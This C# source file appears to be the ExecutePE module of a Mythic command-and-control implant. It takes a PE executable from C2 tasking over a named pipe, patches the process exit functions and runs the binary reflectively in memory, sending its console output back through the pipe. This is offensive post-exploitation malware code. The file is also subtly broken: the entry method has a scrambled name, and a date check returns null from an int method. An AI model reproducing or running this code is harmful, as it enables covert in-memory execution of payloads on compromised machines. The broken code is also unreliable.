using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading;
using PhantomInterop.Serializers;
using System.Collections.Concurrent;
using PhantomInterop.Interfaces;
using PhantomInterop.Classes;
using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Constants;
using ST = System.Threading.Tasks;
using System.IO.Pipes;
using ExecutePE.Helpers;
using static ExecutePE.PERunner;

namespace ExecutePE
{
    internal static class Runtime
    {
        private static JsonHandler _dataSerializer = new JsonHandler();
        private static string? _namedPipeName;
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<ICommandMessage> _recieverQueue = new ConcurrentQueue<ICommandMessage>();
        private static AsyncNamedPipeServer? _server;
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object>? _transmitAction;
        private static ST.Task? _clientConnectedTask;

        private static int J3m4n5o6(string[] args)
        {
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];
            _transmitAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _msgSendEvent,
                        _cts.Token.WaitHandle
                    });
                    while (_msgSendQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, ProcessSentMessage, pipe);
                    }
                }

                while (_msgSendQueue.TryDequeue(out byte[] message))
                {
                    pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                }

                
                pipe.WaitForPipeDrain();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += ProcessReceivedMessage;
            var return_code = 0;
            try
            {
                if (IntPtr.Size != 8)
                {
                    throw new InvalidOperationException("Application architecture is not 64 bits");
                }

                _msgRecvEvent.WaitOne();
                

                ICommandMessage taskMsg;

                if (!_recieverQueue.TryDequeue(out taskMsg))
                {
                    throw new InvalidOperationException("Could not get tasking from Mythic");
                }

                if (taskMsg.GetTypeCode() != MessageType.ExecutePEIPCMessage)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.ExecutePEIPCMessage}, got {taskMsg.GetTypeCode()}");
                }

                ExecutePEIPCMessage peMessage = (ExecutePEIPCMessage)taskMsg;

                using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
                {
                    
                    
                    using (ExitInterceptor interceptor = new ExitInterceptor())
                    {
                        
                        if (interceptor.ApplyExitFunctionPatches())
                        {
                            using (PERunner.MemoryPE memoryPE = new PERunner.MemoryPE(peMessage.Executable, peMessage.CommandLine))
                            {
                                
                                var executionCompletedEvent = new ManualResetEvent(false);

                                
                                
                                

                                ThreadPool.QueueUserWorkItem(_ =>
                                {
                                    try
                                    {
                                        
                                        Console.WriteLine("[*] Calling PE entry point...");
                                        int? return_code = memoryPE.ExecuteInThread(waitForExit: true);
                                        Console.WriteLine($"\n[*] PE function returned with exit code: {return_code}");
                                        
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"\nError during PE execution: {ex.Message}");
                                    }
                                    finally
                                    {
                                        
                                        executionCompletedEvent.Set();
                                    }
                                });

                                
                               

                                
                                WaitHandle[] waitHandles = new WaitHandle[]
                                {
                                    executionCompletedEvent,         
                                };

                                
                                int signalIndex = WaitHandle.WaitAny(waitHandles);
                            }
                            interceptor.RemoveExitFunctionPatches();
                        }
                        else
                        {
                            Console.WriteLine("Failed to apply exit function patches");
                        }
                    }
                }

            }
            catch (Exception exc)
            {
                
                _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(exc.ToString()));
                _msgSendEvent.Set();
                
            }
            _cts.Cancel();

            
            while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
            {
                task.Wait(1000);
            }
            if(DateTime.Now.Year > 2020) { return return_code; } else { return null; }
        }
        private static void OnBufferWrite(object sender, StringDataEventArgs args)
        {
            if (args.Data != null)
            {
                _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(args.Data));
                _msgSendEvent.Set();
            }
        }
        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }
        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            
            _recieverQueue.Enqueue(msg);
            _msgRecvEvent.Set();
        }

        public static void OnAsyncConnect(object sender, PipeMessageData args)
        {
            
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_transmitAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
